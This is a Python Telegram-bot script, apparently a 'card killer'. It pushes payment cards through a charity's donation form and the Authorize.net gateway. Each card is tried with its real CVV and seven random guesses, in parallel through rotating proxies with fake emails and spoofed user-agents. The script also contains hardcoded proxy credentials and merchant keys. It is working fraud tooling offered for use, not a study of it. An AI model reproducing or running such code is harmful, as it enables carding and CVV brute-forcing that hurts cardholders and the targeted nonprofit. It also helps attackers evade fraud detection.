import requests
import re
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from requests.exceptions import Timeout

# Retry logic configuration
MAX_RETRIES = 3
RETRY_DELAY = 2  # in seconds

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('donation_killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Proxy configurations
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more Webshare proxy usernames if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# Random User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    """Returns a random User-Agent."""
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    """Generate a random email."""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

def get_fresh_cookies(proxy: dict) -> dict:
    """Fetches fresh cookies from the donation page."""
    for attempt in range(MAX_RETRIES):
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'user-agent': get_random_user_agent(),
            }
            response = requests.get(
                'https://chacofund.org/donations/donatetoday/',
                headers=headers,
                proxies=proxy,
                timeout=5
            )
            response.raise_for_status()
            return response.cookies.get_dict()
        except Timeout as e:
            logger.warning(f"Timeout error while fetching cookies, attempt {attempt + 1}/{MAX_RETRIES}: {str(e)}")
        except Exception as e:
            logger.error(f"Failed to fetch cookies: {str(e)}")
        time.sleep(RETRY_DELAY)
    return {}

def get_dynamic_id(session: requests.Session, proxy: dict) -> str:
    """Fetches the dynamic form ID from the donation page."""
    try:
        headers = {
            'user-agent': get_random_user_agent(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }
        response = session.get(
            'https://chacofund.org/donations/donatetoday/',
            headers=headers,
            proxies=proxy,
            timeout=15
        )
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        link_tag = soup.find('link', {'rel': 'alternate', 'type': 'application/json'})
        if link_tag:
            href = link_tag.get('href', '')
            match = re.search(r'/give_forms/(\d+)', href)
            if match:
                return match.group(1)
        return None
    except Exception as e:
        logger.error(f"Failed to fetch dynamic ID: {str(e)}")
        return None

def get_authorize_token(session: requests.Session, card_info: str, cvv: str, proxy: dict) -> str:
    """Fetches the Authorize.net dataValue token."""
    card_parts = re.split(r'[|/ ]', card_info.strip())
    cc, mm, yy, real_cvv = card_parts
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://chacofund.org',
        'Referer': 'https://chacofund.org/',
        'User-Agent': get_random_user_agent(),
    }
    json_data = {
        'securePaymentContainerRequest': {
            'merchantAuthentication': {
                'name': '5N3n8uEe',
                'clientKey': '9fFyU2a4HPP8GfWz2xHyzJ25k2pDr56aW9s8pkQKh8BtpTazJ36xjR3R72VCpXbj',
            },
            'data': {
                'type': 'TOKEN',
                'id': '389c3bc0-bca6-7b1f-6bc1-158dc59818b1',
                'token': {
                    'cardNumber': cc,
                    'expirationDate': f"{mm}{yy}",
                    'cardCode': cvv,
                },
            },
        },
    }
    try:
        response = session.post(
            'https://api2.authorize.net/xml/v1/request.api',
            headers=headers,
            json=json_data,
            proxies=proxy,
            timeout=5
        )
        pattern = r'"dataValue":\s*"([^"]+)"'
        match = re.search(pattern, response.text)
        if match:
            return match.group(1)
        logger.error("No dataValue found in Authorize.net response")
        return None
    except Exception as e:
        logger.error(f"Error fetching Authorize.net token: {str(e)}")
        return None

def reset_form_nonce(session: requests.Session, dynamic_id: str, proxy: dict) -> Tuple[str, str]:
    """Resets the form nonce and retrieves hash and nonce."""
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://chacofund.org',
        'referer': f'https://chacofund.org/donations/donatetoday/?payment-mode=authorize&form-id={dynamic_id}',
        'user-agent': get_random_user_agent(),
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'action': 'give_donation_form_reset_all_nonce',
        'give_form_id': dynamic_id,
    }
    try:
        response = session.post(
            'https://chacofund.org/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            proxies=proxy,
            timeout=5
        )
        response_data = response.json()
        return response_data['data']['give_form_hash'], response_data['data']['give_form_user_register_hash']
    except Exception as e:
        logger.error(f"Error resetting form nonce: {str(e)}")
        return None, None

def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    """Processes a single CVV with a fresh session."""
    card_parts = re.split(r'[|/ ]', card_info.strip())
    cc, mm, yy, real_cvv = card_parts
    with requests.Session() as session:
        cookies = get_fresh_cookies(proxy)
        dynamic_id = get_dynamic_id(session, proxy)
        if not dynamic_id:
            return f"{cvv} - Error: Could not fetch dynamic form ID"

        data_value = get_authorize_token(session, card_info, cvv, proxy)
        if not data_value:
            return f"{cvv} - Error: Could not fetch Authorize.net token"

        give_form_hash, _ = reset_form_nonce(session, dynamic_id, proxy)
        if not give_form_hash:
            return f"{cvv} - Error: Could not reset form nonce"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://chacofund.org',
            'referer': f'https://chacofund.org/donations/donatetoday/?form-id={dynamic_id}&payment-mode=authorize&level-id=0',
            'user-agent': get_random_user_agent(),
        }
        params = {
            'payment-mode': 'authorize',
            'form-id': dynamic_id,
        }
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': f'{dynamic_id}-1',
            'give-form-id': dynamic_id,
            'give-form-title': 'Donate Today',
            'give-current-url': 'https://chacofund.org/donations/donatetoday/',
            'give-form-url': 'https://chacofund.org/donations/donatetoday/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': give_form_hash,
            'give-price-id': '0',
            'give-amount': '30.00',
            'payment-mode': 'authorize',
            'give_first': 'Mohammed',
            'give_last': 'Nehal',
            'give_email': generate_random_email(),
            'card_number': '0000000000000000',
            'card_cvc': '000',
            'card_name': '0000000000000000',
            'card_exp_month': '00',
            'card_exp_year': '00',
            'card_expiry': '00 / 00',
            'give_authorize_data_descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
            'give_authorize_data_value': data_value,
            'give_action': 'purchase',
            'give-gateway': 'authorize',
        }
        try:
            response = session.post(
                'https://chacofund.org/donations/donatetoday/',
                params=params,
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )
            # Parse only the relevant div for errors
            soup = BeautifulSoup(response.text, 'html.parser', parse_only=SoupStrainer('div', class_='give_notices give_errors'))
            error_div = soup.find('div', class_='give_error give_notice')
            if error_div:
                p_tag = error_div.find('p')
                if p_tag:
                    message = ' '.join(p_tag.stripped_strings)
                    logger.info(f"CVV {cvv}: {message}")
                    return f"{cvv} - {message}"
            logger.info(f"CVV {cvv}: No error message found")
            return f"{cvv} - No error message found"
        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

async def process_card(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram."""
    user_id = event.sender_id
    chat = await event.get_chat()

    try:
        card_parts = re.split(r'[|/ ]', card_info.strip())
        cc, mm, yy, real_cvv = card_parts
        if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and real_cvv.isdigit()):
            raise ValueError("Invalid card format")
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))

    end_time = time.time()
    total_time = end_time - start_time
    result_message = "\n☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"
    for result in results:
        cvv, msg = result.split(' - ', 1)
    result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"

    await processing_msg.edit(result_message)
